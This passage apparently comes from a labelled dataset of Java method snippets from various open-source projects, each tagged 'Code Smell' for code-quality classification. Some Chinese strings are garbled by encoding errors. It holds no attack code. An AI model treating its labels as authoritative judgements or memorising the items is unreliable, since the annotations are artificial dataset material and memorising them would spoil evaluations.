        throw new IllegalArgumentException(""invalid groupkey:"" + groupKey);
      }
    }
 else     if ('%' == c) {
      char next=groupKey.charAt(++i);
      char nextnext=groupKey.charAt(++i);
      if ('2' == next && 'B' == nextnext) {
        sb.append('+');
      }
 else       if ('2' == next && '5' == nextnext) {
        sb.append('%');
      }
 else {
        throw new IllegalArgumentException(""invalid groupkey:"" + groupKey);
      }
    }
 else {
      sb.append(c);
    }
  }
  if (StringUtils.isBlank(group)) {
    group=sb.toString();
    if (group.length() == 0) {
      throw new IllegalArgumentException(""invalid groupkey:"" + groupKey);
    }
  }
 else {
    tenant=sb.toString();
    if (group.length() == 0) {
      throw new IllegalArgumentException(""invalid groupkey:"" + groupKey);
    }
  }
  return new String[]{dataId,group,tenant};
}",1,Code Smell
"public boolean probablyRingtone(){
  if (isVoiceOnce())   return false;
  if (getDocument() != null && RingtoneDataStore.ringtoneSupportedMimeType.contains(getDocument().mime_type) && getDocument().size < MessagesController.getInstance(currentAccount).ringtoneSizeMax * 2) {
    for (int a=0; a < getDocument().attributes.size(); a++) {
      TLRPC.DocumentAttribute attribute=getDocument().attributes.get(a);
      if (attribute instanceof TLRPC.TL_documentAttributeAudio) {
        if (attribute.duration < 60) {
          return true;
        }
      }
    }
  }
  return false;
}",1,Code Smell
"@Override public boolean readFromClipboard(CompoundTag tag,Player player,Direction side,boolean simulate){
  boolean upstreamResult=ValueSettingsBehaviour.super.readFromClipboard(tag,player,side,simulate);
  if (!tag.contains(""Filter""))   return upstreamResult;
  if (simulate)   return true;
  if (getWorld().isClientSide)   return true;
  ItemStack refund=ItemStack.EMPTY;
  if (getFilter(side).getItem() instanceof FilterItem && !player.isCreative())   refund=getFilter(side).copy();
  ItemStack copied=ItemStack.of(tag.getCompound(""Filter""));
  if (copied.getItem() instanceof FilterItem && !player.isCreative()) {
    InvWrapper inv=new InvWrapper(player.getInventory());
    for (    boolean preferStacksWithoutData : Iterate.trueAndFalse) {
      if (refund.getItem() != filterType && ItemHelper.extract(inv,stack -> stack.getItem() == filterType && preferStacksWithoutData != stack.hasTag(),1,false).isEmpty())       continue;
      if (!refund.isEmpty() && refund.getItem() != filterType)       player.getInventory().placeItemBackInInventory(refund);
      setFilter(side,copied);
      return true;
    }
    player.displayClientMessage(Lang.translate(""logistics.filter.requires_item_in_inventory"",copied.getHoverName().copy().withStyle(ChatFormatting.WHITE)).style(ChatFormatting.RED).component(),true);
    AllSoundEvents.DENY.playOnServer(player.level(),player.blockPosition(),1,1);
    return false;
  }
  if (!refund.isEmpty())   player.getInventory().placeItemBackInInventory(refund);
  return setFilter(side,copied);
}",1,Code Smell
"public static int getHysteresisOffset(TextView textView,int x,int y,int previousOffset){
  final Layout layout=textView.getLayout();
  if (layout == null) {
    return -1;
  }
  int line=layout.getLineForVertical(y);
  if (isEndOfLineOffset(layout,previousOffset)) {
    int left=(int)layout.getPrimaryHorizontal(previousOffset - 1);
    int right=(int)layout.getLineRight(line);
    int threshold=(right - left) / 2;
    if (x > right - threshold) {
      previousOffset-=1;
    }
  }
  final int previousLine=layout.getLineForOffset(previousOffset);
  final int previousLineTop=layout.getLineTop(previousLine);
  final int previousLineBottom=layout.getLineBottom(previousLine);
  final int hysteresisThreshold=(previousLineBottom - previousLineTop) / 2;
  if (((line == previousLine + 1) && ((y - previousLineBottom) < hysteresisThreshold)) || ((line == previousLine - 1) && ((previousLineTop - y) < hysteresisThreshold))) {
    line=previousLine;
  }
  int offset=layout.getOffsetForHorizontal(line,x);
  if (offset < textView.getText().length() - 1) {
    if (isEndOfLineOffset(layout,offset + 1)) {
      int left=(int)layout.getPrimaryHorizontal(offset);
      int right=(int)layout.getLineRight(line);
      int threshold=(right - left) / 2;
      if (x > right - threshold) {
        offset+=1;
      }
    }
  }
  return offset;
}",1,Code Smell
"@Override public void requestCheck(){
  if (StringUtils.isEmpty(orderItemId) || StringUtils.isEmpty(content) || isPublic == null) {
    throw new ValidateException(CommentRetCode.REQUISITE_PARAMETER_NOT_EXIST.getCode(),CommentRetCode.REQUISITE_PARAMETER_NOT_EXIST.getMessage());
  }
}
",1,Code Smell
"/** 
 * Fast layout when there is no structure change, adapter change, etc. It will layout all views was layout requested or updated, until hit a view with different size,  then it break and detachAndScrap all views after that.
 */
private void fastRelayout(){
  boolean invalidateAfter=false;
  final int childCount=getChildCount();
  int position=mGrid.getFirstVisibleIndex();
  int index=0;
  mFlag&=~PF_FAST_RELAYOUT_UPDATED_SELECTED_POSITION;
  for (; index < childCount; index++, position++) {
    View view=getChildAt(index);
    if (position != getAdapterPositionByView(view)) {
      invalidateAfter=true;
      break;
    }
    Grid.Location location=mGrid.getLocation(position);
    if (location == null) {
      invalidateAfter=true;
      break;
    }
    int startSecondary=getRowStartSecondary(location.row) + mWindowAlignment.secondAxis().getPaddingMin() - mScrollOffsetSecondary;
    int primarySize, end;
    int start=getViewMin(view);
    int oldPrimarySize=getViewPrimarySize(view);
    LayoutParams lp=(LayoutParams)view.getLayoutParams();
    if (lp.viewNeedsUpdate()) {
      mFlag|=PF_FAST_RELAYOUT_UPDATED_SELECTED_POSITION;
      detachAndScrapView(view,mRecycler);
      view=getViewForPosition(position);
      addView(view,index);
    }
    measureChild(view);
    if (mOrientation == HORIZONTAL) {
      primarySize=getDecoratedMeasuredWidthWithMargin(view);
      end=start + primarySize;
    }
 else {
      primarySize=getDecoratedMeasuredHeightWithMargin(view);
      end=start + primarySize;
    }
    layoutChild(location.row,view,start,end,startSecondary);
    if (oldPrimarySize != primarySize) {
      if (DEBUG)       Log.d(getTag(),""fastRelayout: view size changed at "" + position);
      invalidateAfter=true;
      break;
    }
  }
  if (invalidateAfter) {
    final int savedLastPos=mGrid.getLastVisibleIndex();
    for (int i=childCount - 1; i >= index; i--) {
      View v=getChildAt(i);
      detachAndScrapView(v,mRecycler);
    }
    mGrid.invalidateItemsAfter(position);
    if ((mFlag & PF_PRUNE_CHILD) != 0) {
      appendVisibleItems();
      if (mFocusPosition >= 0 && mFocusPosition <= savedLastPos) {
        while (mGrid.getLastVisibleIndex() < mFocusPosition) {
          mGrid.appendOneColumnVisibleItems();
        }
      }
    }
 else {
      while (mGrid.appendOneColumnVisibleItems() && mGrid.getLastVisibleIndex() < savedLastPos)       ;
    }
  }
  updateScrollLimits();
  updateSecondaryScrollLimits();
}",1,Code Smell
"/** 
 * 添加消息到发送超时管理器
 * @param msg
 */
public void add(MessageProtobuf.Msg msg){
  if (msg == null || msg.getHead() == null) {
    return;
  }
  int handshakeMsgType=-1;
  int heartbeatMsgType=-1;
  int clientReceivedReportMsgType=imsClient.getClientReceivedReportMsgType();
  MessageProtobuf.Msg handshakeMsg=imsClient.getHandshakeMsg();
  if (handshakeMsg != null && handshakeMsg.getHead() != null) {
    handshakeMsgType=handshakeMsg.getHead().getMsgType();
  }
  MessageProtobuf.Msg heartbeatMsg=imsClient.getHeartbeatMsg();
  if (heartbeatMsg != null && heartbeatMsg.getHead() != null) {
    heartbeatMsgType=heartbeatMsg.getHead().getMsgType();
  }
  int msgType=msg.getHead().getMsgType();
  if (msgType == handshakeMsgType || msgType == heartbeatMsgType || msgType == clientReceivedReportMsgType) {
    return;
  }
  String msgId=msg.getHead().getMsgId();
  if (!mMsgTimeoutMap.containsKey(msgId)) {
    MsgTimeoutTimer timer=new MsgTimeoutTimer(imsClient,msg);
    mMsgTimeoutMap.put(msgId,timer);
  }
  System.out.println(""添加消息超发送超时管理器，message="" + msg + ""\t当前管理器消息数：""+ mMsgTimeoutMap.size());
}",1,Code Smell
"/** 
 * 淇濆瓨瑙掕壊
 * @param roleForm 瑙掕壊琛ㄥ崟鏁版嵁
 * @return {@link Boolean}
 */
@Override public boolean saveRole(RoleForm roleForm){
  Long roleId=roleForm.getId();
  SysRole oldRole=null;
  if (roleId != null) {
    oldRole=this.getById(roleId);
    Assert.isTrue(oldRole != null,""瑙掕壊涓嶅瓨鍦�"");
  }
  String roleCode=roleForm.getCode();
  long count=this.count(new LambdaQueryWrapper<SysRole>().ne(roleId != null,SysRole::getId,roleId).and(wrapper -> wrapper.eq(SysRole::getCode,roleCode).or().eq(SysRole::getName,roleForm.getName())));
  Assert.isTrue(count == 0,""瑙掕壊鍚嶇О鎴栬鑹茬紪鐮佸凡瀛樺湪锛岃淇敼鍚庨噸璇曪紒"");
  SysRole role=roleConverter.form2Entity(roleForm);
  boolean result=this.saveOrUpdate(role);
  if (result) {
    if (oldRole != null && (!StrUtil.equals(oldRole.getCode(),roleCode) || !ObjectUtil.equals(oldRole.getStatus(),roleForm.getStatus()))) {
      roleMenuService.refreshRolePermsCache(oldRole.getCode(),roleCode);
    }
  }
  return result;
}",1,Code Smell
"/** 
 * Sets the boot argument at the indicated position.
 * @param n position of argument to set
 * @param cst {@code Constant} instance
 */
public void set(int n,Constant cst){
  if (cst instanceof CstString || cst instanceof CstType || cst instanceof CstInteger|| cst instanceof CstLong|| cst instanceof CstFloat|| cst instanceof CstDouble|| cst instanceof CstMethodHandle|| cst instanceof CstProtoRef) {
    set0(n,cst);
  }
 else {
    Class<?> klass=cst.getClass();
    throw new IllegalArgumentException(""bad type for boot argument: "" + klass);
  }
}",1,Code Smell
"void createHeadersTransition(){
  mHeadersTransition=TransitionHelper.loadTransition(FragmentUtil.getContext(BrowseFragment.this),mShowingHeaders ? R.transition.lb_browse_headers_in : R.transition.lb_browse_headers_out);
  TransitionHelper.addTransitionListener(mHeadersTransition,new TransitionListener(){
    @Override public void onTransitionStart(    Object transition){
    }
    @Override public void onTransitionEnd(    Object transition){
      mHeadersTransition=null;
      if (mMainFragmentAdapter != null) {
        mMainFragmentAdapter.onTransitionEnd();
        if (!mShowingHeaders && mMainFragment != null) {
          View mainFragmentView=mMainFragment.getView();
          if (mainFragmentView != null && !mainFragmentView.hasFocus()) {
            mainFragmentView.requestFocus();
          }
        }
      }
      if (mHeadersFragment != null) {
        mHeadersFragment.onTransitionEnd();
        if (mShowingHeaders) {
          VerticalGridView headerGridView=mHeadersFragment.getVerticalGridView();
          if (headerGridView != null && !headerGridView.hasFocus()) {
            headerGridView.requestFocus();
          }
        }
      }
      updateTitleViewVisibility();
      if (mBrowseTransitionListener != null) {
        mBrowseTransitionListener.onHeadersTransitionStop(mShowingHeaders);
      }
    }
  }
);
}
",1,Code Smell
"private void firePhotoEditorSDKListener(View view,boolean isStart){
  Object viewTag=view.getTag();
  if (mOnPhotoEditorListener != null && viewTag != null && viewTag instanceof ViewType) {
    if (isStart) {
      mOnPhotoEditorListener.onStartViewChangeListener(((ViewType)view.getTag()));
    }
 else {
      mOnPhotoEditorListener.onStopViewChangeListener(((ViewType)view.getTag()));
    }
  }
}
",1,Code Smell
"/** 
 * 是否需要过滤的类
 * @param classes 类集合
 */
private static void filter(Set<Class<?>> classes){
  final Iterator<Class<?>> it=classes.iterator();
  while (it.hasNext()) {
    final Class<?> clazz=it.next();
    if (null == clazz || isSelf(clazz) || isUnsafeClass(clazz) || isUnsupportedClass(clazz)) {
      it.remove();
    }
  }
}
",1,Code Smell
"private BitSet parseStep(String token){
  try {
    String[] tokenParts=token.split(""/"");
    if (tokenParts.length != 2) {
      throw new InvalidCronExpressionException(String.format(INVALID_FIELD,this.fieldName,token));
    }
    String stepSizePart=tokenParts[1];
    int stepSize=this.parseValue(stepSizePart);
    if (stepSize < 1) {
      throw new InvalidCronExpressionException(String.format(INVALID_FIELD + "" minimum allowed step (every) value is \""1\"""",this.fieldName,token));
    }
    String numSetPart=tokenParts[0];
    if (!numSetPart.contains(""-"") && !numSetPart.equals(""*"") && isInteger(numSetPart)) {
      numSetPart=String.format(""%s-%d"",numSetPart,this.maxAllowedValue);
    }
    BitSet numSet=this.parse(numSetPart);
    BitSet stepsSet=new BitSet(this.length);
    for (int i=numSet.nextSetBit(0); i < this.length; i+=stepSize) {
      stepsSet.set(i);
    }
    stepsSet.and(numSet);
    return stepsSet;
  }
 catch (  NumberFormatException ex) {
    throw new InvalidCronExpressionException(String.format(INVALID_FIELD,this.fieldName,token),ex);
  }
}",1,Code Smell
"/** 
 * Shows user home anonymous comments page.
 * @param context the specified context
 */
public void showHomeAnonymousComments(final RequestContext context){
  final Request request=context.getRequest();
  final AbstractFreeMarkerRenderer renderer=new SkinRenderer(context,""home/comments.ftl"");
  final Map<String,Object> dataModel=renderer.getDataModel();
  dataModelService.fillHeaderAndFooter(context,dataModel);
  final boolean isLoggedIn=(Boolean)dataModel.get(Common.IS_LOGGED_IN);
  JSONObject currentUser=null;
  if (isLoggedIn) {
    currentUser=Sessions.getUser();
  }
  final JSONObject user=(JSONObject)context.attr(User.USER);
  if (null == currentUser || (!currentUser.optString(Keys.OBJECT_ID).equals(user.optString(Keys.OBJECT_ID))) && !Role.ROLE_ID_C_ADMIN.equals(currentUser.optString(User.USER_ROLE))) {
    context.sendError(404);
    return;
  }
  final int pageNum=Paginator.getPage(request);
  final int pageSize=Symphonys.USER_HOME_LIST_CNT;
  final int windowSize=Symphonys.USER_HOME_LIST_WIN_SIZE;
  fillHomeUser(dataModel,user,roleQueryService);
  avatarQueryService.fillUserAvatarURL(user);
  final String followingId=user.optString(Keys.OBJECT_ID);
  dataModel.put(Follow.FOLLOWING_ID,followingId);
  if (isLoggedIn) {
    currentUser=Sessions.getUser();
    final String followerId=currentUser.optString(Keys.OBJECT_ID);
    final boolean isFollowing=followQueryService.isFollowing(followerId,followingId,Follow.FOLLOWING_TYPE_C_USER);
    dataModel.put(Common.IS_FOLLOWING,isFollowing);
  }
  final List<JSONObject> userComments=commentQueryService.getUserComments(user.optString(Keys.OBJECT_ID),Comment.COMMENT_ANONYMOUS_C_ANONYMOUS,pageNum,pageSize,currentUser);
  dataModel.put(Common.USER_HOME_COMMENTS,userComments);
  int recordCount=0;
  int pageCount=0;
  if (!userComments.isEmpty()) {
    final JSONObject first=userComments.get(0);
    pageCount=first.optInt(Pagination.PAGINATION_PAGE_COUNT);
    recordCount=first.optInt(Pagination.PAGINATION_RECORD_COUNT);
  }
  final List<Integer> pageNums=Paginator.paginate(pageNum,pageSize,pageCount,windowSize);
  if (!pageNums.isEmpty()) {
    dataModel.put(Pagination.PAGINATION_FIRST_PAGE_NUM,pageNums.get(0));
    dataModel.put(Pagination.PAGINATION_LAST_PAGE_NUM,pageNums.get(pageNums.size() - 1));
  }
  dataModel.put(Pagination.PAGINATION_CURRENT_PAGE_NUM,pageNum);
  dataModel.put(Pagination.PAGINATION_PAGE_COUNT,pageCount);
  dataModel.put(Pagination.PAGINATION_PAGE_NUMS,pageNums);
  dataModel.put(Pagination.PAGINATION_RECORD_COUNT,recordCount);
  dataModel.put(Common.TYPE,""commentsAnonymous"");
}",1,Code Smell
"@JsonIgnore public boolean hasTaskRunJoinable(TaskRun taskRun){
  if (this.taskRunList == null) {
    return true;
  }
  TaskRun current=this.taskRunList.stream().filter(r -> r.isSame(taskRun)).findFirst().orElse(null);
  if (current == null) {
    return true;
  }
  if ((current.getAttempts() == null && taskRun.getAttempts() != null) || (current.getAttempts() != null && taskRun.getAttempts() != null && current.getAttempts().size() < taskRun.getAttempts().size())) {
    return true;
  }
  if (current.getState().getCurrent() == taskRun.getState().getCurrent()) {
    return false;
  }
  if (current.getState().isTerminated() && !taskRun.getState().isTerminated()) {
    return false;
  }
  if (current.getState().getHistories().size() > taskRun.getState().getHistories().size()) {
    return false;
  }
  return true;
}
",1,Code Smell
"/** 
 * Creates a  {@link Values}. <p>The  {@code values} array must have the same number of entries as{@code fieldNames}, or an integer multiple if you wish to create multiple rows. <p>If there are zero rows, or if all values of a any column are null, this method cannot deduce the type of columns. For these cases, call  {@link #values(Iterable,RelDataType)}.
 * @param fieldNames Field names
 * @param values Values
 */
public RelBuilder values(String[] fieldNames,Object... values){
  if (fieldNames == null || fieldNames.length == 0 || values.length % fieldNames.length != 0 || values.length < fieldNames.length) {
    throw new IllegalArgumentException(""Value count must be a positive multiple of field count"");
  }
  final int rowCount=values.length / fieldNames.length;
  for (  Ord<String> fieldName : Ord.zip(fieldNames)) {
    if (allNull(values,fieldName.i,fieldNames.length)) {
      throw new IllegalArgumentException(""All values of field '"" + fieldName.e + ""' are null; cannot deduce type"");
    }
  }
  final ImmutableList<ImmutableList<RexLiteral>> tupleList=tupleList(fieldNames.length,values);
  final RelDataTypeFactory typeFactory=cluster.getTypeFactory();
  final RelDataTypeFactory.Builder builder=typeFactory.builder();
  for (  final Ord<String> fieldName : Ord.zip(fieldNames)) {
    final String name=fieldName.e != null ? fieldName.e : ""expr$"" + fieldName.i;
    final RelDataType type=typeFactory.leastRestrictive(new AbstractList<RelDataType>(){
      public RelDataType get(      int index){
        return tupleList.get(index).get(fieldName.i).getType();
      }
      public int size(){
        return rowCount;
      }
    }
);
    builder.add(name,type);
  }
  final RelDataType rowType=builder.build();
  return values(tupleList,rowType);
}
/** 
 * Creates a  {@link Values} with a specified row type.<p>This method can handle cases that  {@link #values(String[],Object...)}cannot, such as all values of a column being null, or there being zero rows.
 * @param rowType Row type
 * @param columnValues Values
 */
public RelBuilder values(RelDataType rowType,Object... columnValues){
  final ImmutableList<ImmutableList<RexLiteral>> tupleList=tupleList(rowType.getFieldCount(),columnValues);
  RelNode values=valuesFactory.createValues(cluster,rowType,ImmutableList.copyOf(tupleList));
  push(values);
  return this;
}
/** 
 * Creates a  {@link Values} with a specified row type.<p>This method can handle cases that  {@link #values(String[],Object...)}cannot, such as all values of a column being null, or there being zero rows.
 * @param tupleList Tuple list
 * @param rowType Row type
 */
public RelBuilder values(Iterable<? extends List<RexLiteral>> tupleList,RelDataType rowType){
  RelNode values=valuesFactory.createValues(cluster,rowType,copy(tupleList));
  push(values);
  return this;
}
/** 
 * Creates a  {@link Values} with a specified row type andzero rows.
 * @param rowType Row type
 */
public RelBuilder values(RelDataType rowType){
  return values(ImmutableList.<ImmutableList<RexLiteral>>of(),rowType);
}",1,Code Smell
"private List<Map<String,String>> getDataList(Map<String,Map<String,Object>> obj,boolean actionFlag){
  List<Map<String,String>> highlightList=new ArrayList<>();
  List<Map<String,String>> extractList=new ArrayList<>();
  if (obj != null && !obj.isEmpty() && obj.size() > 0) {
    if (actionFlag) {
      List<List<String>> resultList=extractColorsAndComments(obj);
      List<String> colorList=resultList.get(0);
      List<String> commentList=resultList.get(1);
      if (!colorList.isEmpty() && !commentList.isEmpty()) {
        String color=retrieveFinalColor(retrieveColorIndices(colorList));
        Map<String,String> colorMap=new HashMap<String,String>(){
{
            put(""color"",color);
          }
        }
;
        Map<String,String> commentMap=new HashMap<String,String>(){
{
            put(""comment"",String.join("", "",commentList));
          }
        }
;
        highlightList.add(colorMap);
        highlightList.add(commentMap);
      }
    }
 else {
      extractList.add(extractDataFromMap(obj));
    }
  }
  return actionFlag ? highlightList : extractList;
}",1,Code Smell
"private void setAppState(final Activity act,String pkgName,MenuItem item,boolean enable){
  try {
    PackageManager pm=act.getPackageManager();
    pm.setApplicationEnabledSetting(pkgName,enable ? PackageManager.COMPONENT_ENABLED_STATE_DEFAULT : PackageManager.COMPONENT_ENABLED_STATE_DISABLED,0);
    int state=pm.getApplicationEnabledSetting(pkgName);
    boolean isEnabledOrDefault=(state == PackageManager.COMPONENT_ENABLED_STATE_ENABLED || state == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT);
    if ((enable && isEnabledOrDefault) || (!enable && !isEnabledOrDefault)) {
      item.setTitle(act.getResources().getIdentifier(enable ? ""app_manager_disable_text"" : ""app_manager_enable_text"",""string"",""com.miui.securitycenter""));
      Toast.makeText(act,act.getResources().getIdentifier(enable ? ""app_manager_enabled"" : ""app_manager_disabled"",""string"",""com.miui.securitycenter""),Toast.LENGTH_SHORT).show();
    }
 else {
      Toast.makeText(act,getModuleRes(act).getString(R.string.disable_app_fail),Toast.LENGTH_LONG).show();
    }
    new Handler().postDelayed(act::invalidateOptionsMenu,500);
  }
 catch (  Throwable t) {
    logW(TAG,"""",t);
  }
}",1,Code Smell
"/** 
 * Picks an order for the blocks by doing ""trace"" analysis. 
 */
private void pickOrder(){
  BasicBlockList blocks=method.getBlocks();
  int sz=blocks.size();
  int maxLabel=blocks.getMaxLabel();
  int[] workSet=Bits.makeBitSet(maxLabel);
  int[] tracebackSet=Bits.makeBitSet(maxLabel);
  for (int i=0; i < sz; i++) {
    BasicBlock one=blocks.get(i);
    Bits.set(workSet,one.getLabel());
  }
  int[] order=new int[sz];
  int at=0;
  for (int label=method.getFirstLabel(); label != -1; label=Bits.findFirst(workSet,0)) {
    traceBack:     for (; ; ) {
      IntList preds=method.labelToPredecessors(label);
      int psz=preds.size();
      for (int i=0; i < psz; i++) {
        int predLabel=preds.get(i);
        if (Bits.get(tracebackSet,predLabel)) {
          break;
        }
        if (!Bits.get(workSet,predLabel)) {
          continue;
        }
        BasicBlock pred=blocks.labelToBlock(predLabel);
        if (pred.getPrimarySuccessor() == label) {
          label=predLabel;
          Bits.set(tracebackSet,label);
          continue traceBack;
        }
      }
      break;
    }
    while (label != -1) {
      Bits.clear(workSet,label);
      Bits.clear(tracebackSet,label);
      order[at]=label;
      at++;
      BasicBlock one=blocks.labelToBlock(label);
      BasicBlock preferredBlock=blocks.preferredSuccessorOf(one);
      if (preferredBlock == null) {
        break;
      }
      int preferred=preferredBlock.getLabel();
      int primary=one.getPrimarySuccessor();
      if (Bits.get(workSet,preferred)) {
        label=preferred;
      }
 else       if ((primary != preferred) && (primary >= 0) && Bits.get(workSet,primary)) {
        label=primary;
      }
 else {
        IntList successors=one.getSuccessors();
        int ssz=successors.size();
        label=-1;
        for (int i=0; i < ssz; i++) {
          int candidate=successors.get(i);
          if (Bits.get(workSet,candidate)) {
            label=candidate;
            break;
          }
        }
      }
    }
  }
  if (at != sz) {
    throw new RuntimeException(""shouldn't happen"");
  }
  this.order=order;
}",1,Code Smell
"@Override public boolean validRexOperands(int count,Litmus litmus){
  if (count != 2) {
    if ((this == SqlStdOperatorTable.AND || this == SqlStdOperatorTable.OR) && count > 2) {
      return true;
    }
    return litmus.fail(""wrong operand count {} for {}"",count,this);
  }
  return litmus.succeed();
}",1,Code Smell
"private void onNextClick(View v){
  String first=firstNameInput.getText().toString();
  String last=lastNameInput.getText().toString();
  String username=usernameInput.getText().toString();
  if (first.length() < 2 || last.length() < 2 || username.length() < 2) {
    Toast.makeText(getActivity(),R.string.all_fields_are_required,Toast.LENGTH_SHORT).show();
    return;
  }
  if (username.length() > 16) {
    Toast.makeText(getActivity(),R.string.username_limit,Toast.LENGTH_SHORT).show();
    return;
  }
  new UpdateName(first + "" "" + last).wrapProgress(getActivity()).setCallback(new Callback<BaseResponse>(){
    @Override public void onSuccess(    BaseResponse result){
      new UpdateUsername(username).wrapProgress(getActivity()).setCallback(new Callback<BaseResponse>(){
        @Override public void onSuccess(        BaseResponse result){
          Toast.makeText(getActivity(),R.string.welcome_to_clubhouse,Toast.LENGTH_SHORT).show();
          Nav.goClearingStack(getActivity(),HomeFragment.class,null);
        }
        @Override public void onError(        ErrorResponse error){
          error.showToast(getActivity());
        }
      }
).exec();
    }
    @Override public void onError(    ErrorResponse error){
      error.showToast(getActivity());
    }
  }
).exec();
}",1,Code Smell
"private void maybeTriggerPendingMessages(long oldPeriodPositionUs,long newPeriodPositionUs) throws ExoPlaybackException {
  if (pendingMessages.isEmpty() || playbackInfo.periodId.isAd()) {
    return;
  }
  if (playbackInfo.startPositionUs == oldPeriodPositionUs) {
    oldPeriodPositionUs--;
  }
  int currentPeriodIndex=playbackInfo.timeline.getIndexOfPeriod(playbackInfo.periodId.periodUid);
  PendingMessageInfo previousInfo=nextPendingMessageIndex > 0 ? pendingMessages.get(nextPendingMessageIndex - 1) : null;
  while (previousInfo != null && (previousInfo.resolvedPeriodIndex > currentPeriodIndex || (previousInfo.resolvedPeriodIndex == currentPeriodIndex && previousInfo.resolvedPeriodTimeUs > oldPeriodPositionUs))) {
    nextPendingMessageIndex--;
    previousInfo=nextPendingMessageIndex > 0 ? pendingMessages.get(nextPendingMessageIndex - 1) : null;
  }
  PendingMessageInfo nextInfo=nextPendingMessageIndex < pendingMessages.size() ? pendingMessages.get(nextPendingMessageIndex) : null;
  while (nextInfo != null && nextInfo.resolvedPeriodUid != null && (nextInfo.resolvedPeriodIndex < currentPeriodIndex || (nextInfo.resolvedPeriodIndex == currentPeriodIndex && nextInfo.resolvedPeriodTimeUs <= oldPeriodPositionUs))) {
    nextPendingMessageIndex++;
    nextInfo=nextPendingMessageIndex < pendingMessages.size() ? pendingMessages.get(nextPendingMessageIndex) : null;
  }
  while (nextInfo != null && nextInfo.resolvedPeriodUid != null && nextInfo.resolvedPeriodIndex == currentPeriodIndex && nextInfo.resolvedPeriodTimeUs > oldPeriodPositionUs && nextInfo.resolvedPeriodTimeUs <= newPeriodPositionUs) {
    try {
      sendMessageToTarget(nextInfo.message);
    }
  finally {
      if (nextInfo.message.getDeleteAfterDelivery() || nextInfo.message.isCanceled()) {
        pendingMessages.remove(nextPendingMessageIndex);
      }
 else {
        nextPendingMessageIndex++;
      }
    }
    nextInfo=nextPendingMessageIndex < pendingMessages.size() ? pendingMessages.get(nextPendingMessageIndex) : null;
  }
}",1,Code Smell
"@Override public void startBuy(String itemId,String userName){
  Boolean exists=this.redisTemplate.hasKey(""INSTANT_"" + itemId);
  if (exists == null || !exists) {
    throw new MsgException(""绉掓潃鍟嗗搧涓嶅瓨鍦�"");
  }
  long number=this.redisTemplate.opsForHash().increment(""INSTANT_"" + itemId,""number"",-1);
  if (number < 0) {
    if (number == Long.MIN_VALUE)     this.redisTemplate.delete(""INSTANT_"" + itemId);
    throw new MsgException(""鍟嗗搧宸茶绉掓潃瀹�"");
  }
  DateFormat formatter=new SimpleDateFormat(""yyyy-MM-dd HH:mm:ss"");
  Date startTime=null;
  Date endTime=null;
  try {
    startTime=formatter.parse((String)this.redisTemplate.opsForHash().get(""INSTANT_"" + itemId,""start_time""));
    endTime=formatter.parse((String)this.redisTemplate.opsForHash().get(""INSTANT_"" + itemId,""end_time""));
  }
 catch (  ParseException e) {
    e.printStackTrace();
    throw new MsgException(""鏃ユ湡鏍煎紡寮傚父"");
  }
  Date nowTime=new Date();
  if (nowTime.compareTo(startTime) < 0)   throw new MsgException(""绉掓潃杩樻湭寮�濮�"");
  if (nowTime.compareTo(endTime) > 0)   throw new MsgException(""绉掓潃宸茬粡缁撴潫"");
  Boolean itemUser=this.redisTemplate.hasKey(itemId + userName);
  if (itemUser == null || itemUser)   throw new MsgException(""鎮ㄥ凡缁忕鏉�杩囪鍟嗗搧"");
  String result=(String)this.rabbitTemplate.convertSendAndReceive(""instantBuyExchange"",""instantBuy"",itemId + userName);
  if (result != null && result.equals(itemId + userName + ""_SUCCESS"")) {
    this.redisTemplate.opsForValue().set(itemId + userName,""SUCCESS"",1,TimeUnit.HOURS);
  }
 else {
    throw new MsgException(""绉掓潃澶辫触"");
  }
}",1,Code Smell
"private static InetAddress getLocalAddress0(){
  InetAddress localAddress=null;
  try {
    localAddress=InetAddress.getLocalHost();
    InetAddress addressItem=toValidAddress(localAddress);
    if (addressItem != null) {
      return addressItem;
    }
  }
 catch (  Throwable e) {
    logger.error(e.getMessage(),e);
  }
  try {
    Enumeration<NetworkInterface> interfaces=NetworkInterface.getNetworkInterfaces();
    if (null == interfaces) {
      return localAddress;
    }
    while (interfaces.hasMoreElements()) {
      try {
        NetworkInterface network=interfaces.nextElement();
        if (network.isLoopback() || network.isVirtual() || !network.isUp()) {
          continue;
        }
        Enumeration<InetAddress> addresses=network.getInetAddresses();
        while (addresses.hasMoreElements()) {
          try {
            InetAddress addressItem=toValidAddress(addresses.nextElement());
            if (addressItem != null) {
              try {
                if (addressItem.isReachable(100)) {
                  return addressItem;
                }
              }
 catch (              IOException e) {
              }
            }
          }
 catch (          Throwable e) {
            logger.error(e.getMessage(),e);
          }
        }
      }
 catch (      Throwable e) {
        logger.error(e.getMessage(),e);
      }
    }
  }
 catch (  Throwable e) {
    logger.error(e.getMessage(),e);
  }
  return localAddress;
}",1,Code Smell
"private void updateMute(NotificationsSettingsActivity.NotificationException exception,View view,int position,boolean isNew,boolean mute){
  final String key=NotificationsController.getSharedPrefKey(exception.did,0);
  final SharedPreferences prefs=getNotificationsSettings();
  final SharedPreferences.Editor edit=prefs.edit();
  boolean isTopPeer=isTop5Peer(currentAccount,exception.did);
  exception.notify=mute ? Integer.MAX_VALUE : 0;
  if (exception.auto) {
    exception.auto=false;
    edit.putBoolean(""stories_"" + key,!mute).commit();
    if (autoExceptions != null) {
      autoExceptions.remove(exception);
    }
    if (exceptions == null) {
      exceptions=new ArrayList<>();
    }
    exceptions.add(0,exception);
  }
 else   if (isTopPeer) {
    edit.putBoolean(""stories_"" + key,!mute).commit();
  }
 else   if (mute ? (storiesEnabled == null || !storiesEnabled) : (storiesEnabled != null && storiesEnabled)) {
    deleteException(exception,view,position);
    return;
  }
 else {
    edit.putBoolean(""stories_"" + key,!mute).commit();
  }
  if (view instanceof UserCell) {
    ((UserCell)view).setException(exception,null,((UserCell)view).needDivider);
  }
  getNotificationsController().updateServerNotificationsSettings(exception.did,0,false);
  updateRows(true);
}",1,Code Smell
"@Override public Bitmap get(int width,int height,Bitmap.Config config){
  final int size=Util.getBitmapByteSize(width,height,config);
  Key key=keyPool.get(size);
  Integer possibleSize=sortedSizes.ceilingKey(size);
  if (possibleSize != null && possibleSize != size && possibleSize <= size * MAX_SIZE_MULTIPLE) {
    keyPool.offer(key);
    key=keyPool.get(possibleSize);
  }
  final Bitmap result=groupedMap.get(key);
  if (result != null) {
    result.reconfigure(width,height,config);
    decrementBitmapOfSize(possibleSize);
  }
  return result;
}
public Key get(int size){
  Key result=get();
  result.init(size);
  return result;
}
",1,Code Smell
"/** 
 * 鏌ヨ瀵煎叆椤哄簭
